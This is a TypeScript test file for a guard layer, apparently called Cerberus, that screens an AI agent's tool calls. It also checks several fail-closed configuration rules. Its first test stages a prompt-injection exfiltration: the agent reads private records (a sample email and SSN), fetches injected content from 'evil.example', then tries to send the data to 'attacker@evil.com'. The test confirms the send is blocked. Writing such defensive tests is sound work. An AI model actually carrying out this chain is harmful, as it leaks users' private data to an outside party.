/**
 * High-signal regression tests for recent hardening work.
 *
 * These tests intentionally cover security contracts that are easy to
 * accidentally weaken during refactors:
 * - outbound interrupts must prevent side effects
 * - guard() must expose structured last-outcome metadata
 * - unsafe startup configurations must fail closed
 * - proxy config must reject ambiguous executor definitions
 */

import { describe, expect, it, vi } from 'vitest';
import type { RawToolExecutorFn, ToolExecutorResult } from '../../src/engine/interceptor.js';
import { guard } from '../../src/middleware/wrap.js';
import { createProxy } from '../../src/proxy/server.js';
import type { CerberusConfig } from '../../src/types/config.js';

const PRIVATE_DATA = JSON.stringify({
  records: [{ email: 'alice@example.com', ssn: '123-45-6789' }],
});

const TRUSTED_UNTRUSTED_CONFIG: CerberusConfig = {
  alertMode: 'interrupt',
  threshold: 3,
  trustOverrides: [
    { toolName: 'readPrivateData', trustLevel: 'trusted' },
    { toolName: 'fetchExternalContent', trustLevel: 'untrusted' },
  ],
};

const OUTBOUND_TOOLS = ['sendOutboundReport'];

function makeExecutors(): {
  readPrivateData: RawToolExecutorFn;
  fetchExternalContent: RawToolExecutorFn;
  sendOutboundReport: RawToolExecutorFn;
} {
  return {
    readPrivateData: vi.fn(async (_args: Record<string, unknown>): Promise<ToolExecutorResult> => {
      await Promise.resolve();
      return PRIVATE_DATA;
    }),
    fetchExternalContent: vi.fn(
      async (_args: Record<string, unknown>): Promise<ToolExecutorResult> => {
        await Promise.resolve();
        return '<html>inject</html>';
      },
    ),
    sendOutboundReport: vi.fn(
      async (_args: Record<string, unknown>): Promise<ToolExecutorResult> => {
        await Promise.resolve();
        return 'sent';
      },
    ),
  };
}

describe('hardening regressions', () => {
  it('must not execute outbound side effects when interrupt fires preflight', async () => {
    const executors = makeExecutors();
    const result = guard(executors, TRUSTED_UNTRUSTED_CONFIG, OUTBOUND_TOOLS);

    await result.executors.readPrivateData({});
    await result.executors.fetchExternalContent({ url: 'https://evil.example' });

    const blocked = await result.executors.sendOutboundReport({
      recipient: 'attacker@evil.com',
      body: 'alice@example.com 123-45-6789',
    });

    expect(blocked).toContain('[Cerberus]');
    expect(executors.sendOutboundReport).not.toHaveBeenCalled();
    expect(result.getLastOutcome()).toMatchObject({
      blocked: true,
      executorRan: false,
      phase: 'preflight',
      action: 'interrupt',
      toolName: 'sendOutboundReport',
    });
  });

  it('must fail closed when interrupt mode lacks trusted and untrusted classification', () => {
    expect(() =>
      guard(makeExecutors(), { alertMode: 'interrupt', threshold: 3 }, OUTBOUND_TOOLS),
    ).toThrow(/trusted and one untrusted tool classification/i);
  });

  it('must fail closed when memoryTracking is enabled without memory tools', () => {
    expect(() =>
      guard(makeExecutors(), { ...TRUSTED_UNTRUSTED_CONFIG, memoryTracking: true }, OUTBOUND_TOOLS),
    ).toThrow(/memory tools/i);
  });

  it('must reject duplicate trust overrides', () => {
    expect(() =>
      guard(
        makeExecutors(),
        {
          ...TRUSTED_UNTRUSTED_CONFIG,
          trustOverrides: [
            { toolName: 'readPrivateData', trustLevel: 'trusted' },
            { toolName: 'readPrivateData', trustLevel: 'untrusted' },
          ],
        },
        OUTBOUND_TOOLS,
      ),
    ).toThrow(/duplicate trust override/i);
  });

  it('proxy config must reject tools that define both handler and target', () => {
    expect(() =>
      createProxy({
        port: 0,
        cerberus: { alertMode: 'log' },
        tools: {
          sendOutboundReport: {
            handler: () => Promise.resolve('ok'),
            target: 'http://localhost:3001/send',
            outbound: true,
          },
        },
      }),
    ).toThrow(/cannot specify both "target" and "handler"/i);
  });
});
